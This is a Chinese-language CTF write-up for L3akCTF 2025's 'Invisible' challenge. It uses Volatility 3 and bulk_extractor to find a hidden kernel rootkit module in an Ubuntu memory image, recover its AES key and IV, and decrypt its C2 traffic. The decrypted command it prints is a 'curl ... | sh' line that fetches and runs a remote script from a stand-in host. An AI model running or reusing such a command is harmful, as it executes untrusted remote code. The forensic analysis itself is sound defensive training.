# L3akCTF 2025 Invisible Writeup

## 题目简述

附件包含约 1 GB 的 Ubuntu 22.04 Linux 内存镜像和对应的 Volatility 3 symbols JSON。系统中存在一个伪装成正常 framebuffer 模块的隐藏内核模块，它创建内核线程、连接外部地址并用 AES-256-CBC 处理网络数据。

题目没有随仓库提供官方 WP 或 solver。下面根据内存分析结果和公开复现记录，完整归纳“隐藏模块定位 → 模块恢复与逆向 → 从内存 carving 网络包 → 解密 C2 载荷”的路线。

## 解题过程

### 配置符号并发现异常内核线程

把随附件给出的 `Ubuntu-22.04.4-5.19.0-1030.json` 放入：

```text
volatility3/symbols/linux/
```

枚举进程：

```bash
python3 vol.py -f memdump.elf linux.pslist
```

末尾出现：

```text
PID   PPID  COMM
3754  ...   sudo
3755  3754  sudo
3756  3755  su
3757  3756  bash
3853  2     core_logic_thre
```

PID 3853 的父进程是 PID 2 `kthreadd`，说明它不是普通用户态程序，而是内核线程。直接按进程 dump 会得到 `N/A`。

### 找到被隐藏的模块

普通 `linux.lsmod` 中没有明显异常，但隐藏模块扫描能发现：

```bash
python3 vol.py -f memdump.elf linux.hidden_modules
```

```text
Address         Name
0xffffc0884300  sysfillrec
```

Linux 中确有正常模块 `sysfillrect`，恶意模块故意少写最后一个 `t`，伪装成相似名称。用 page cache 恢复文件系统：

```bash
python3 vol.py -f memdump.elf linux.pagecache.RecoverFs
```

在输出的 `recovered_fs.tar.gz` 中可找到：

```text
usr/lib/modules/5.19.0-1030-lowlatency/kernel/drivers/video/fbdev/sysfillrec.ko
```

也可以用 `linux.pagecache.InodePages` 只恢复目标 inode。

### 逆向模块，恢复 AES key 和 IV

模块申请的算法名为：

```text
cbc(aes)
```

`_compile_hint_map_impl` 用一个下标表重排 32 字节数组。按逆向结果还原：

```python
key_index = [
    0x05, 0x0B, 0x0C, 0x1D, 0x14, 0x15, 0x16, 0x01,
    0x0A, 0x00, 0x0D, 0x0E, 0x0F, 0x06, 0x04, 0x07,
    0x03, 0x10, 0x13, 0x02, 0x1C, 0x1B, 0x08, 0x09,
    0x11, 0x12, 0x17, 0x1A, 0x19, 0x1E, 0x18, 0x1F,
]
key_source = bytes([
    0x50, 0x46, 0x47, 0x5A, 0x53, 0x41, 0x53, 0x4C,
    0x33, 0x46, 0x4B, 0x4E, 0x54, 0x4D, 0x53, 0x41,
    0x5A, 0x47, 0x36, 0x46, 0x4D, 0x44, 0x59, 0x36,
    0x43, 0x46, 0x50, 0x4D, 0x58, 0x54, 0x32, 0x46,
])
key = bytes(key_source[i] for i in key_index)
print(key)
```

输出 32 字节 AES-256 key：

```text
ANTTMDYFKPMSASSLZZFGXM3FG66PF2CF
```

`_dispatch_phase_impl` 以同样方式重排 16 字节数组：

```python
iv_index = [3, 0, 8, 10, 12, 15, 7, 9, 11, 1, 14, 4, 5, 6, 2, 13]
iv_source = bytes([
    0x41, 0x47, 0x47, 0x51, 0x43, 0x4C, 0x46, 0x34,
    0x53, 0x54, 0x4D, 0x50, 0x42, 0x32, 0x41, 0x4D,
])
iv = bytes(iv_source[i] for i in iv_index)
print(iv)
```

得到：

```text
QASMBM4TPGACLFG2
```

模块随后创建名为 `core_logic_thread` 的线程，并在 `_background_entry` 中连接：

```text
10.0.2.17
```

这把进程表中的异常线程、隐藏模块和待恢复的网络密文关联起来。

### 从内存 carving 网络流量

内核线程没有普通用户态 `mm` / `active_mm`，不能按进程地址空间轻易搜索接收缓冲区。可直接让 `bulk_extractor` 扫描整份内存，并启用网络 scanner 生成 PCAP：

```bash
bulk_extractor -o carved memdump.elf
```

打开生成的流量并过滤：

```text
ip.addr == 10.0.2.17
```

短 TCP 会话中可恢复十六进制 payload：

```text
2db0ecd9c366f325e4461f31a6d543ea13d5d8c125e367c5ee2f7684847be70958add8d98c6fbbc2a7b3753997c0a5a82e22468c9622fcd9d1c9a13530bdbf029c5f2c48a6a6147bf686e9b11ccb9eaf8244d8177d4c5d0322e3918749637576
```

### 解密并处理命令中的 Base64

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b"ANTTMDYFKPMSASSLZZFGXM3FG66PF2CF"
iv = b"QASMBM4TPGACLFG2"
ct = bytes.fromhex(
    "2db0ecd9c366f325e4461f31a6d543ea"
    "13d5d8c125e367c5ee2f7684847be709"
    "58add8d98c6fbbc2a7b3753997c0a5a8"
    "2e22468c9622fcd9d1c9a13530bdbf02"
    "9c5f2c48a6a6147bf686e9b11ccb9eaf"
    "8244d8177d4c5d0322e3918749637576"
)
command = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
print(command.decode())
```

明文是：

```text
curl https://0xS1rx58.l3ak/TDNBS3tNM20wcnlfTjNWM3JfRjByRzN0NV9UaDNfU2g0RDB3cy4uIX0K.sh | sh
```

URL 文件名去掉 `.sh` 后是 Base64。解码：

```python
name = b"TDNBS3tNM20wcnlfTjNWM3JfRjByRzN0NV9UaDNfU2g0RDB3cy4uIX0K"
print(base64.b64decode(name).decode())
```

得到：

```text
L3AK{M3m0ry_N3V3r_F0rG3t5_Th3_Sh4D0ws..!}
```

仓库没有附带解题材料；[Linux 内存取证复现记录](https://medium.com/@rifqiaramadhan/insmod-kernel-rootkit-and-network-carving-another-linux-memory-forensics-approach-l3akctf-b1e547e8c1b6) 给出了隐藏模块、重排表和网络 carving 结果。本文已经转写了全部决定性参数，不依赖外链即可复现。

## 方法总结

这题的“invisible”同时体现在两个位置：模块从普通模块链表中隐藏，通信又发生在没有常规用户态地址空间的内核线程中。正确路线是先用 `hidden_modules` 与 page cache 恢复恶意 `.ko`，从逆向中取得 AES 参数和 C2 地址，再绕开进程 dump，直接对整份内存 carving 网络包。主障碍仍是内存证据恢复与关联，因此归入 Forensics，而不是单纯的内核逆向题。
